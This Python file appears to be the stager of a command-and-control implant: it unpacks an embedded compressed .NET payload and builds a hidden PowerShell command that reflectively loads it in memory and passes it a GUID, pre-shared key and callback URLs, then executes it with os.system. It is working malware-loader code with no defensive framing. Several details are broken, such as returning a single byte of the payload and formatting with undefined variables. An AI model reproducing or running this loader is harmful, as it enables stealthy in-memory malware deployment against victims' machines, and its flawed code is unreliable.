
import base64,ctypes,zlib,os


class Stager:

    def __init__(self,guid,psk,urls,b64):
        self.guid = guid
        self.psk = psk
        self.urls = urls
        self.b64 = b64

        
    def get_stage2(self):
        # Stage 2 is a gzip compressed PE file          
        compressed   =  base64.b64decode(self.b64)      # Base64 decode the archieve 
        decompressed = zlib.decompress(compressed,-15)  # Decompress the PE file
        return decompressed[64]

    def gen_ps_line(self):
        stage2_hex = self.get_stage2().hex()            # Convert the stage 2 PE file from bytes to hex in order to pass it to powershell
        
        # Unfortunately I haven't figured out a good way to load the stage 2 PE file in memory natively.
        # I unfortunately couldn't get pymemimporter (https://github.com/n1nj4sec/pymemimporter) to work.
        # This (https://medium.com/@AntiSec_Inc/combining-the-power-of-python-and-assembly-a4cf424be01d) \
        # looks promissing but is way above my skill level to implement.
        
        powershell_load_pe_str   = "powershell.exe -nop -w hidden -c "
        powershell_load_pe_str   += """\"
        $asm = [Reflection.Assembly]::Load([byte[]] -split ('{stage2}' -replace '..', '0x$& '))
        $asm.EntryPoint.Invoke($null, [System.Object[]](,[string[]]@('{guid}','{psk}','{url}')))\"
        """.format(guid=guid,psk=psk,url=urls,stage2=stage2_hex).strip()
        return powershell_load_pe_str

    def os_system_exec(self):
        os.system(self.gen_ps_line())
    


"""
if __name__ == "__main__":

    stager = Stager(guid,psk,urls,b64)    
    stager.os_system_exec()
"""
